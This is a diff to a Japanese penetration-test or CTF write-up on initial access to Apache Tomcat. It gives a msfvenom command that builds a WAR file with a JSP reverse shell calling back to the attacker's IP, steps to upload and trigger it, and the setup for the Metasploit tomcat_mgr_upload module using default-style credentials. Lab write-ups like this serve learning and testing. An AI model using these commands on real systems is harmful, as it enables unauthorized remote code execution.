@@ -97,10 +97,28 @@ curl -u "tomcat:s3cret" http://<TARGET_IP>:8080/manager/html
 
 ## 侵入 / Initial Access
 
-### Tomcat Manager WAR Upload → RCE
+### WAR ファイルとは
+
+WAR (Web Application Archive) は Java Web アプリケーションのパッケージ形式。
+Tomcat Manager から `.war` をデプロイすると、そのアプリが即座に起動・実行される。
+悪意のあるコード（リバースシェル）を仕込んだ WAR を上げると RCE が成立する。
+
+### WAR ファイルの作成方法
+
+#### 方法1: msfvenom で生成（手動）
 
 ```bash
-# Metasploit で WAR 生成・アップロード・実行を自動化
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<自分のIP> LPORT=4444 -f war -o shell.war
+```
+
+生成した `shell.war` を Tomcat Manager の GUI からアップロード後、
+`http://<TARGET_IP>:8080/shell/` にアクセスするとシェルが起動する。
+
+#### 方法2: Metasploit モジュールで自動化（推奨）
+
+WAR の生成・アップロード・実行を全て自動で処理してくれる。
+
+```bash
 use exploit/multi/http/tomcat_mgr_upload
 set RHOSTS <TARGET_IP>
 set RPORT 8080
